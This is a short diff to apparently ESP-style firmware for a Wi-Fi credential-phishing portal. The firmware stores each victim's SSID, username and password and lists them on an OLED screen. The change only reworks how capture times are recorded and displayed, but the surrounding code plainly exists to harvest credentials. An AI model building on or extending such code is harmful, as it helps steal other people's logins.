@@ -23,7 +23,7 @@ struct Credential {
     String ssid;
     String username;
     String password;
-    String timestamp;
+    unsigned long captureTime;
 };
 
 static std::vector<Credential> capturedCreds;
@@ -167,8 +167,7 @@ void handleLogin() {
         newCred.ssid = currentSSID;
         newCred.username = username;
         newCred.password = password;
-        unsigned long minutes = millis() / 60000;
-        newCred.timestamp = String(minutes) + "m";
+        newCred.captureTime = millis();
         
         capturedCreds.push_back(newCred);
     }
@@ -387,8 +386,11 @@ void drawCredentialsList() {
         u8g2.drawStr(0, 34, "Pass:");
         u8g2.drawStr(30, 34, passStr);
         char infoStr[32];
-        snprintf(infoStr, sizeof(infoStr), "%d/%d - %s ago", 
-                credIndex + 1, (int)capturedCreds.size(), cred.timestamp.c_str());
+        unsigned long currentTime = millis();
+        unsigned long elapsedMs = currentTime - cred.captureTime;
+        unsigned long elapsedMinutes = elapsedMs / 60000;
+        snprintf(infoStr, sizeof(infoStr), "%d/%d - %lum ago", 
+                credIndex + 1, (int)capturedCreds.size(), elapsedMinutes);
         u8g2.drawStr(0, 46, infoStr);
         
         u8g2.setFont(u8g2_font_5x8_tr);
